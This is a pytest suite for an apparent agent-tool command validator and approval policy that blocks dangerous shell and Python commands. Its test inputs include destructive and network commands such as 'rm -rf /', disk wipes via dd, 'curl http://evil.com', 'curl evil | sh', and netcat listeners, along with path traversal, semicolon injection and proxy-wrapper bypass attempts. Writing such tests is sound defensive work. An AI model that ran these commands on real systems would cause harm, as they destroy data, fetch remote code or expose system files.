"""Tests for saber.tools.security — ValidationResult, CommandSecurityValidator, defaults, build_tool_approval."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from saber.tools.security import (
    _DEFAULT_DANGEROUS_PATTERNS,
    CommandSecurityValidator,
    ToolSecurityConfig,
    ValidationResult,
    _merge_with_defaults,
    default_security_config,
)

# ── Fixtures ────────────────────────────────────────────────────────


@pytest.fixture
def default_validator() -> CommandSecurityValidator:
    """Validator using the default security config."""
    return CommandSecurityValidator(default_security_config())


# ── ValidationResult ────────────────────────────────────────────────


class TestValidationResult:
    """ValidationResult: frozen Pydantic model for validation outcomes."""

    def test_construction_safe(self) -> None:
        result = ValidationResult(is_safe=True)
        assert result.is_safe is True
        assert result.reason is None
        assert result.matched_pattern is None
        assert result.blocked_command is None

    def test_construction_unsafe(self) -> None:
        result = ValidationResult(
            is_safe=False,
            reason="test reason",
            matched_pattern=r"test\s+pattern",
            blocked_command="rm",
        )
        assert result.is_safe is False
        assert result.reason == "test reason"
        assert result.matched_pattern == r"test\s+pattern"
        assert result.blocked_command == "rm"

    def test_frozen(self) -> None:
        result = ValidationResult(is_safe=True)
        with pytest.raises((TypeError, ValidationError)):
            result.is_safe = False  # type: ignore[misc]

    def test_defaults(self) -> None:
        result = ValidationResult(is_safe=False)
        assert result.reason is None
        assert result.matched_pattern is None
        assert result.blocked_command is None


# ── _merge_with_defaults ─────────────────────────────────────────────


class TestMergeWithDefaults:
    """Test _merge_with_defaults helper directly."""

    def test_merges_blocked_commands_union(self) -> None:
        cfg = ToolSecurityConfig(blocked_commands=frozenset({"custom_cmd"}))
        merged = _merge_with_defaults(cfg)
        assert "custom_cmd" in merged.blocked_commands
        assert "sudo" in merged.blocked_commands  # from defaults

    def test_deduplicates_dangerous_patterns(self) -> None:
        # Pass a pattern that already exists in defaults
        cfg = ToolSecurityConfig(dangerous_patterns=_DEFAULT_DANGEROUS_PATTERNS[:3])
        merged = _merge_with_defaults(cfg)
        assert len(merged.dangerous_patterns) == len(set(merged.dangerous_patterns))

    def test_preserves_user_scalars(self) -> None:
        cfg = ToolSecurityConfig(allow_semicolons=True, max_content_length=8192)
        merged = _merge_with_defaults(cfg)
        assert merged.allow_semicolons is True
        assert merged.max_content_length == 8192

    def test_merges_sensitive_directories(self) -> None:
        cfg = ToolSecurityConfig(sensitive_directories=("/custom/dir",))
        merged = _merge_with_defaults(cfg)
        assert "/custom/dir" in merged.sensitive_directories
        assert "/etc" in merged.sensitive_directories  # from defaults


# ── Blocked Commands ────────────────────────────────────────────────


class TestBlockedCommands:
    """Commands with a blocked base command should be rejected."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "sudo apt install",
            "curl http://evil.com",
            "wget http://evil.com",
            "nc -l 4444",
            "docker run ubuntu",
            "git push origin main",
            "python3 -c 'print(1)'",
            "rm -rf /",
            "ssh user@host",
            "chmod 777 /etc/passwd",
            "dd if=/dev/zero of=/dev/sda",
            "kill -9 1",
            "apt install nmap",
        ],
    )
    def test_blocked_command(self, cmd: str, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate(cmd)
        assert not result.is_safe


# ── Allowed Commands ────────────────────────────────────────────────


class TestAllowedCommands:
    """allowed_commands should bypass the blocked_commands check."""

    def test_allowed_command_bypasses_block(self) -> None:
        config = ToolSecurityConfig(
            blocked_commands=frozenset({"mysql", "sudo"}),
            allowed_commands=frozenset({"mysql"}),
        )
        validator = CommandSecurityValidator(config)

        # mysql is allowed despite being in blocked_commands
        result = validator.validate("mysql -u admin db")
        assert result.is_safe

        # sudo is still blocked (not in allowed)
        result = validator.validate("sudo something")
        assert not result.is_safe
        assert result.blocked_command == "sudo"

    def test_allowed_command_with_path_prefix(self) -> None:
        """allowed_commands also works when the command has a path prefix."""
        config = ToolSecurityConfig(
            blocked_commands=frozenset({"mysql"}),
            allowed_commands=frozenset({"mysql"}),
        )
        validator = CommandSecurityValidator(config)
        result = validator.validate("/usr/bin/mysql -u admin db")
        assert result.is_safe


# ── Proxy Bypass ────────────────────────────────────────────────────


class TestProxyBypass:
    """Commands wrapped by env/nice/timeout etc. should still be caught."""

    @pytest.mark.parametrize(
        "cmd,expected_blocked",
        [
            ("env git push origin main", "git"),
            ("env curl http://evil.com/payload", "curl"),
            ("env python3 script.py", "python3"),
            ("nice -n 10 ssh user@host", "ssh"),
            ("timeout 5 curl http://evil.com", "curl"),
            ("nohup wget http://evil.com", "wget"),
            ("stdbuf -oL python3 script.py", "python3"),
            ("xargs -I {} rm /tmp/file", "rm"),
        ],
    )
    def test_proxy_wrapped_blocked_command(
        self,
        cmd: str,
        expected_blocked: str,
        default_validator: CommandSecurityValidator,
    ) -> None:
        result = default_validator.validate(cmd)
        assert not result.is_safe
        assert result.blocked_command == expected_blocked

    def test_proxy_chain(self, default_validator: CommandSecurityValidator) -> None:
        """Multiple stacked proxies should still find the real command."""
        result = default_validator.validate("env nice -n 5 timeout 30 curl http://evil.com")
        assert not result.is_safe
        assert result.blocked_command == "curl"

    @pytest.mark.parametrize(
        "cmd",
        [
            "timeout 5s curl http://evil.com",
            "timeout 30m ssh host",
            "timeout 1.5h wget http://evil.com",
            "nice -n 5 timeout 10d nc -l 4444",
        ],
    )
    def test_proxy_bypass_with_time_suffixes(self, cmd: str, default_validator: CommandSecurityValidator) -> None:
        """Numeric args with time suffixes (s/m/h/d) must be skipped."""
        result = default_validator.validate(cmd)
        assert not result.is_safe, f"Should block: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "env VAR=val curl http://evil.com",
            "env -u FOO VAR=val ssh host",
            "env PATH=/tmp HOME=/workspace wget http://evil.com",
        ],
    )
    def test_proxy_bypass_with_env_vars(self, cmd: str, default_validator: CommandSecurityValidator) -> None:
        """env-style VAR=val assignments must be skipped."""
        result = default_validator.validate(cmd)
        assert not result.is_safe, f"Should block: {cmd}"

    def test_proxy_with_allowed_command(self) -> None:
        """Proxy wrapping an allowed command should still pass."""
        config = ToolSecurityConfig(
            blocked_commands=frozenset({"curl", "env"}),
            allowed_commands=frozenset({"curl"}),
        )
        validator = CommandSecurityValidator(config)
        # env itself is blocked, so this should be caught at step 4a
        result = validator.validate("env curl http://example.com")
        assert not result.is_safe

    @pytest.mark.parametrize(
        "cmd,expected_blocked",
        [
            ("timeout -s KILL 5 curl http://evil.com", "curl"),
            ("timeout --signal KILL 5 wget http://evil.com", "wget"),
            ("timeout -s 9 5 ssh host", "ssh"),
            ("env -u FOO ssh host", "ssh"),
            ("timeout -k 5 10 wget http://evil.com", "wget"),
            ("nice -n 10 timeout -s KILL 5 curl http://evil.com", "curl"),
        ],
    )
    def test_proxy_flag_value_bypass(
        self,
        cmd: str,
        expected_blocked: str,
        default_validator: CommandSecurityValidator,
    ) -> None:
        """Proxy commands with flag-value args must not hide blocked commands."""
        result = default_validator.validate(cmd)
        assert not result.is_safe, f"Should block: {cmd}"
        assert result.blocked_command == expected_blocked

    @pytest.mark.parametrize(
        "cmd",
        [
            "doas curl http://evil.com",
            "doas ssh host",
            "command curl http://evil.com",
            "stdbuf -oL curl http://evil.com",
        ],
    )
    def test_proxy_bypass_additional_proxies(self, cmd: str, default_validator: CommandSecurityValidator) -> None:
        """Additional proxy commands (doas, command, stdbuf) should be resolved through."""
        result = default_validator.validate(cmd)
        assert not result.is_safe, f"Should block: {cmd}"

    def test_proxy_only_chain_no_real_command(self, default_validator: CommandSecurityValidator) -> None:
        """A chain of only proxies with no real command should not crash."""
        config = ToolSecurityConfig(
            blocked_commands=frozenset({"curl", "wget"}),
            dangerous_patterns=(),
            semicolon_patterns=(),
        )
        validator = CommandSecurityValidator(config)
        result = validator.validate("env timeout 5")
        assert result.is_safe


# ── Dangerous Patterns ─────────────────────────────────────────────


class TestDangerousPatterns:
    """Content matching dangerous regex patterns should be rejected."""

    @pytest.mark.parametrize(
        "content,pattern_fragment",
        [
            ("echo $(whoami)", r"\$\("),
            ("cat file | bash", r"\|\s*bash\b"),
            ("echo `whoami`", r"`[^`]*`"),
            ("cat file > /etc/passwd", r">\s*/"),
            ("echo rm -rf /tmp", r"rm\s+.*-rf"),
            ("echo chmod 777 /var/www", r"chmod\s+777"),
            ("echo curl evil | sh", r"curl\s+.*\|\s*sh"),
        ],
    )
    def test_dangerous_pattern(
        self,
        content: str,
        pattern_fragment: str,
        default_validator: CommandSecurityValidator,
    ) -> None:
        result = default_validator.validate(content)
        assert not result.is_safe, f"Expected '{content}' to be blocked (pattern: {pattern_fragment})"
        assert result.matched_pattern is not None

    def test_nested_command_substitution_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo $(echo $(whoami))")
        assert not result.is_safe


# ── Semicolon Injection ─────────────────────────────────────────────


class TestSemicolonInjection:
    """Semicolon usage should be controlled by allow_semicolons."""

    def test_semicolon_blocked_by_default(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("ls; rm -rf /")
        assert not result.is_safe

    def test_simple_semicolon_blocked(self, default_validator: CommandSecurityValidator) -> None:
        """Even an innocuous semicolon is blocked when allow_semicolons=False."""
        result = default_validator.validate("echo hello; echo world")
        assert not result.is_safe
        assert result.reason is not None
        assert "semicolon" in result.reason.lower()

    def test_semicolon_allowed_when_enabled(self) -> None:
        base = default_security_config()
        # Manually merge for this test
        merged = ToolSecurityConfig(
            blocked_commands=base.blocked_commands,
            allowed_commands=base.allowed_commands,
            dangerous_patterns=base.dangerous_patterns,
            semicolon_patterns=base.semicolon_patterns,
            max_content_length=base.max_content_length,
            allow_semicolons=True,
            block_null_bytes=base.block_null_bytes,
            block_control_chars=base.block_control_chars,
            block_path_traversal=base.block_path_traversal,
            sensitive_directories=base.sensitive_directories,
            safe_path_prefixes=base.safe_path_prefixes,
        )
        validator = CommandSecurityValidator(merged)
        result = validator.validate("echo hello; echo world")
        assert result.is_safe


# ── Length Limit ────────────────────────────────────────────────────


class TestLengthLimit:
    """Content should be rejected when it exceeds max_content_length."""

    def test_within_limit(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo hello")
        assert result.is_safe

    def test_at_limit(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("a" * 4096)
        assert result.is_safe

    def test_exceeds_limit(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("a" * 4097)
        assert not result.is_safe
        assert result.reason is not None
        assert "limit" in result.reason.lower()

    def test_custom_short_length_limit(self) -> None:
        config = ToolSecurityConfig(max_content_length=10)
        validator = CommandSecurityValidator(config)
        result = validator.validate("a" * 11)
        assert not result.is_safe


# ── Control Characters ──────────────────────────────────────────────


class TestControlChars:
    """Control characters should be handled per config settings."""

    def test_null_byte_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat file\x00.txt")
        assert not result.is_safe
        assert result.reason is not None
        assert "null" in result.reason.lower()

    def test_tab_allowed(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo\thello")
        assert result.is_safe

    def test_newline_allowed(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo hello\necho world")
        assert result.is_safe

    def test_carriage_return_allowed(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo hello\r\necho world")
        assert result.is_safe

    def test_bell_char_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo\x07hello")
        assert not result.is_safe
        assert result.reason is not None
        assert "control" in result.reason.lower()

    @pytest.mark.parametrize(
        "content",
        [
            "\x00cat file.txt",  # null at start
            "cat fi\x00le.txt",  # null in middle
            "cat file.txt\x00",  # null at end
            "ls\x00; rm -rf /",  # null before injection
        ],
    )
    def test_null_bytes_blocked_at_any_position(
        self,
        content: str,
    ) -> None:
        cfg = default_security_config()
        validator = CommandSecurityValidator(cfg)
        result = validator.validate(content)
        assert not result.is_safe
        assert "Null bytes" in (result.reason or "")

    def test_null_bytes_allowed_when_disabled(self) -> None:
        config = ToolSecurityConfig(block_null_bytes=False, block_control_chars=False)
        validator = CommandSecurityValidator(config)
        result = validator.validate("echo\x00hello")
        assert result.is_safe

    def test_control_chars_allowed_when_disabled(self) -> None:
        config = ToolSecurityConfig(block_control_chars=False)
        validator = CommandSecurityValidator(config)
        result = validator.validate("echo\x07hello")
        assert result.is_safe


# ── Path Traversal ──────────────────────────────────────────────────


class TestPathTraversal:
    """Path traversal and sensitive directory access should be blocked."""

    def test_filename_with_double_dots_not_false_positive(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /tmp/my..file")
        assert result.is_safe

    def test_actual_path_traversal_still_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /tmp/../etc/passwd")
        assert not result.is_safe

    def test_path_traversal_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat ../../etc/passwd")
        assert not result.is_safe

    def test_safe_tmp_path(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /tmp/data.csv")
        assert result.is_safe

    def test_safe_home_path(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /home/user/file.txt")
        assert result.is_safe

    def test_safe_workspace_path(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /workspace/data.csv")
        assert result.is_safe

    def test_sensitive_directory_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /etc/hosts")
        assert not result.is_safe

    def test_absolute_outside_safe_prefix_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /opt/secret.txt")
        assert not result.is_safe

    def test_path_traversal_allowed_when_disabled(self) -> None:
        config = ToolSecurityConfig(block_path_traversal=False)
        validator = CommandSecurityValidator(config)
        result = validator.validate("cat ../../etc/passwd")
        assert result.is_safe

    def test_absolute_path_outside_safe_prefixes_blocked(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /etcetera/readme")
        assert not result.is_safe  # still blocked (not a safe prefix)

    def test_homestead_not_matched_as_home(self) -> None:
        config = ToolSecurityConfig(
            safe_path_prefixes=("/home",),
            sensitive_directories=(),
        )
        validator = CommandSecurityValidator(config)
        result = validator.validate("cat /homestead/secret.txt")
        assert not result.is_safe

    def test_exact_safe_prefix_match(self) -> None:
        config = ToolSecurityConfig(
            safe_path_prefixes=("/tmp",),
            sensitive_directories=(),
        )
        validator = CommandSecurityValidator(config)
        result = validator.validate("cat /tmp")
        assert result.is_safe

    def test_exact_sensitive_dir_blocked(self) -> None:
        config = ToolSecurityConfig(
            safe_path_prefixes=(),
            sensitive_directories=("/etc",),
        )
        validator = CommandSecurityValidator(config)
        result = validator.validate("cat /etc")
        assert not result.is_safe


# ── Safe Commands ───────────────────────────────────────────────────


class TestSafeCommands:
    """Known-safe commands should pass validation."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls -la /tmp",
            "cat /tmp/data.csv",
            "echo hello world",
            "head -n 10 /tmp/log.txt",
            "wc -l /tmp/file.txt",
            "grep pattern /tmp/file.txt",
            "sort /tmp/data.csv",
            "tail -f /tmp/log.txt",
            "diff /tmp/a.txt /tmp/b.txt",
            "date",
            "whoami",
            "hostname",
            "pwd",
            "id",
            "printenv",
        ],
    )
    def test_safe_command(self, cmd: str, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate(cmd)
        assert result.is_safe, f"Expected '{cmd}' to be safe but got: {result.reason}"


# ── Malformed Input ─────────────────────────────────────────────────


class TestMalformedInput:
    """Malformed input should be rejected gracefully."""

    def test_unparseable_shell_syntax(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("echo 'unclosed")
        assert not result.is_safe
        assert result.reason is not None
        assert "malformed" in result.reason.lower() or "unparseable" in result.reason.lower()

    def test_empty_string_is_safe(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("")
        assert result.is_safe

    def test_whitespace_only_is_safe(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("   ")
        assert result.is_safe


# ── Custom Config ───────────────────────────────────────────────────


class TestCustomConfig:
    """Custom configs should be respected by the validator."""

    def test_empty_config_allows_most_commands(self) -> None:
        config = ToolSecurityConfig()
        validator = CommandSecurityValidator(config)
        result = validator.validate("sudo rm stuff")
        assert result.is_safe

    def test_fully_permissive_config(self) -> None:
        config = ToolSecurityConfig(
            block_path_traversal=False,
            block_null_bytes=False,
            block_control_chars=False,
            allow_semicolons=True,
        )
        validator = CommandSecurityValidator(config)
        result = validator.validate("sudo rm -rf /")
        assert result.is_safe

    def test_validator_caches_compiled_patterns(self) -> None:
        config = default_security_config()
        validator = CommandSecurityValidator(config)
        assert len(validator._compiled_patterns) == len(config.dangerous_patterns)
        assert len(validator._compiled_semicolons) == len(config.semicolon_patterns)

    def test_effective_blocked_excludes_allowed(self) -> None:
        config = ToolSecurityConfig(
            blocked_commands=frozenset({"rm", "sudo", "curl"}),
            allowed_commands=frozenset({"curl"}),
        )
        validator = CommandSecurityValidator(config)
        assert validator._effective_blocked == frozenset({"rm", "sudo"})

    def test_pattern_too_long_raises_value_error(self) -> None:
        long_pattern = "a" * 501
        config = ToolSecurityConfig(dangerous_patterns=(long_pattern,))
        with pytest.raises(ValueError, match="Pattern too long"):
            CommandSecurityValidator(config)

    def test_pattern_at_exact_max_length_accepted(self) -> None:
        pattern = "x" * 500
        config = ToolSecurityConfig(dangerous_patterns=(pattern,))
        validator = CommandSecurityValidator(config)
        result = validator.validate("test content")
        assert result.is_safe

    def test_invalid_regex_pattern_raises(self) -> None:
        import re as re_mod

        config = ToolSecurityConfig(dangerous_patterns=("[invalid",))
        with pytest.raises(re_mod.error):
            CommandSecurityValidator(config)


# ── Edge Cases ──────────────────────────────────────────────────────


class TestEdgeCases:
    """Edge cases and boundary conditions."""

    def test_command_with_path_prefix_is_resolved(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("/usr/bin/sudo something")
        assert not result.is_safe
        assert result.blocked_command == "sudo"

    def test_command_with_relative_path(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("./rm -rf /tmp/data")
        assert not result.is_safe
        assert result.blocked_command == "rm"

    def test_content_with_only_spaces_before_blocked_cmd(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("  sudo something")
        assert not result.is_safe

    def test_sensitive_etc_subpath(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /etc/nginx/nginx.conf")
        assert not result.is_safe

    def test_var_tmp_is_safe(self, default_validator: CommandSecurityValidator) -> None:
        result = default_validator.validate("cat /var/tmp/output.log")
        assert result.is_safe

    def test_oserror_path_blocked(self, default_validator: CommandSecurityValidator) -> None:
        long_component = "a" * 300
        result = default_validator.validate(f"cat /{long_component}")
        assert not result.is_safe


# ── Default Security Config ────────────────────────────────────────


class TestDefaultSecurityConfig:
    """Tests for default_security_config() function."""

    def test_returns_tool_security_config(self) -> None:
        cfg = default_security_config()
        assert isinstance(cfg, ToolSecurityConfig)

    def test_has_blocked_commands(self) -> None:
        cfg = default_security_config()
        assert len(cfg.blocked_commands) > 50
        assert "sudo" in cfg.blocked_commands
        assert "curl" in cfg.blocked_commands
        assert "rm" in cfg.blocked_commands

    def test_has_dangerous_patterns(self) -> None:
        cfg = default_security_config()
        assert len(cfg.dangerous_patterns) > 30
        assert any("rm" in p for p in cfg.dangerous_patterns)

    def test_has_semicolon_patterns(self) -> None:
        cfg = default_security_config()
        assert len(cfg.semicolon_patterns) > 5

    def test_round_trip(self) -> None:
        cfg = default_security_config()
        dumped = cfg.model_dump()
        restored = ToolSecurityConfig(**dumped)
        assert restored == cfg

    def test_extend_defaults_true(self) -> None:
        cfg = default_security_config()
        assert cfg.extend_defaults is True


# ── build_tool_approval ─────────────────────────────────────────────


class TestBuildToolApproval:
    """Tests for build_tool_approval() function."""

    def test_returns_list_of_approval_policy(self) -> None:
        from inspect_ai.approval import ApprovalPolicy

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": default_security_config(),
        }
        policies = build_tool_approval(configs)
        assert len(policies) == 1
        assert isinstance(policies[0], ApprovalPolicy)

    def test_wildcard_tools(self) -> None:
        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {}
        policies = build_tool_approval(configs)
        assert policies[0].tools == "*"

    @pytest.mark.asyncio
    async def test_empty_configs_approves_dangerous_content(self) -> None:
        """build_tool_approval({}) should approve everything — no tools configured for security."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        policies = build_tool_approval({})
        approver = policies[0].approver
        call = ToolCall(
            id="1",
            function="bash",
            type="function",
            arguments={"cmd": "rm -rf /"},
        )
        result = await approver("", call, ToolCallView(), [])
        assert result.decision == "approve"

    @pytest.mark.asyncio
    async def test_mixed_configs_routes_correctly(self) -> None:
        """Tools WITH security config get validated; tools WITHOUT get approved."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        policies = build_tool_approval({"bash": default_security_config()})
        approver = policies[0].approver

        # bash (has config) with dangerous content → reject
        bash_call = ToolCall(
            id="1",
            function="bash",
            type="function",
            arguments={"cmd": "rm -rf /"},
        )
        result = await approver("", bash_call, ToolCallView(), [])
        assert result.decision == "reject"

        # unknown_tool (no config) with dangerous content → approve (security OFF)
        other_call = ToolCall(
            id="2",
            function="kql_query",
            type="function",
            arguments={"query": "rm -rf /"},
        )
        result = await approver("", other_call, ToolCallView(), [])
        assert result.decision == "approve"

    @pytest.mark.asyncio
    async def test_tool_without_config_approved(self) -> None:
        """Tool not in security_configs → approved (security OFF by default)."""
        from inspect_ai.approval import Approval
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        call = ToolCall(
            id="test-1",
            function="unknown_tool",
            arguments={"data": "sudo rm -rf /"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert isinstance(result, Approval)
        assert result.decision == "approve"

    @pytest.mark.asyncio
    async def test_tool_with_config_validates(self) -> None:
        """Tool in security_configs → validated by CommandSecurityValidator."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        # Dangerous command → rejected
        call = ToolCall(
            id="test-1",
            function="bash",
            arguments={"cmd": "sudo rm -rf /"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "reject"

    @pytest.mark.asyncio
    async def test_safe_command_approved(self) -> None:
        """Safe command through configured tool → approved."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        call = ToolCall(
            id="test-1",
            function="bash",
            arguments={"cmd": "ls -la /tmp"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "approve"

    @pytest.mark.asyncio
    async def test_think_tool_auto_approved(self) -> None:
        """Think tool always auto-approved regardless of content."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "think": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        call = ToolCall(
            id="test-1",
            function="think",
            arguments={"thought": "sudo rm -rf /"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "approve"

    @pytest.mark.asyncio
    async def test_submit_tool_not_auto_approved(self) -> None:
        """Submit tool gets normal security treatment (NOT auto-approved)."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "submit": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        call = ToolCall(
            id="test-1",
            function="submit",
            arguments={"answer": "sudo rm -rf /"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        # submit is NOT in _AUTO_APPROVE_TOOLS, so it gets validated
        assert result.decision == "reject"

    @pytest.mark.asyncio
    async def test_empty_arguments_approved(self) -> None:
        """Tool call with no inspectable content → approved."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        call = ToolCall(
            id="test-1",
            function="bash",
            arguments={},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "approve"

    @pytest.mark.asyncio
    async def test_extend_defaults_merges_with_defaults(self) -> None:
        """When extend_defaults=True, config is merged with default constants."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        # Minimal config with extend_defaults=True (default)
        configs: dict[str, ToolSecurityConfig] = {
            "bash": ToolSecurityConfig(
                allowed_commands=frozenset({"mysql"}),
                extend_defaults=True,
            ),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        # mysql is allowed via custom config
        call = ToolCall(
            id="test-1",
            function="bash",
            arguments={"cmd": "mysql -u admin db"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "approve"

        # curl is blocked via defaults
        call = ToolCall(
            id="test-2",
            function="bash",
            arguments={"cmd": "curl http://evil.com"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "reject"

    @pytest.mark.asyncio
    async def test_extend_defaults_false_no_default_blocks(self) -> None:
        """When extend_defaults=False, only explicit config is used."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": ToolSecurityConfig(
                blocked_commands=frozenset({"only_this"}),
                extend_defaults=False,
            ),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        # curl is NOT blocked (no defaults)
        call = ToolCall(
            id="test-1",
            function="bash",
            arguments={"cmd": "curl http://example.com"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "approve"

        # only_this IS blocked
        call = ToolCall(
            id="test-2",
            function="bash",
            arguments={"cmd": "only_this arg"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "reject"

    @pytest.mark.asyncio
    async def test_rejection_explanation_has_info(self) -> None:
        """Rejection explanation contains useful info."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "bash": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        call = ToolCall(
            id="test-1",
            function="bash",
            arguments={"cmd": "curl http://evil.com"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "reject"
        assert result.explanation is not None
        assert "curl" in result.explanation

    @pytest.mark.asyncio
    async def test_python_tool_validated(self) -> None:
        """Python tool with code key is validated."""
        from inspect_ai.tool import ToolCall, ToolCallView

        from saber.tools.security import build_tool_approval

        configs: dict[str, ToolSecurityConfig] = {
            "python": default_security_config(),
        }
        policies = build_tool_approval(configs)
        approver = policies[0].approver

        # Safe python code
        call = ToolCall(
            id="test-1",
            function="python",
            arguments={"code": "x = 42"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "approve"

        # Dangerous python code
        call = ToolCall(
            id="test-2",
            function="python",
            arguments={"code": "import os; os.system('rm -rf /')"},
            type="function",
        )
        result = await approver(message="", call=call, view=ToolCallView(), history=[])
        assert result.decision == "reject"
